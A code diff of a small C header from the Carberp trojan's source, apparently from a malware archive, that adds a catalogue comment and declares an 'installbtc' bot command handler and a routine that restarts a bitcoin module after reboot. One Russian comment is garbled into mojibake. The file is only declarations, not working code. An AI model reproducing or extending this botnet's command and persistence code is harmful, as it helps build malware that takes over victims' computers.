@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #ifndef BitcoinH
 #define BitcoinH
 
@@ -12,7 +23,7 @@
 #define CommandInstallbtc "installbtc"
 
 bool ExecuteBitcoin(PTaskManager Manager, PCHAR Command, PCHAR Args);
-//запускает биткоин после ребута, если он был запущен до ребута
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 void BitcoinRunAfterReboot();
 
 #endif //BitcoinH
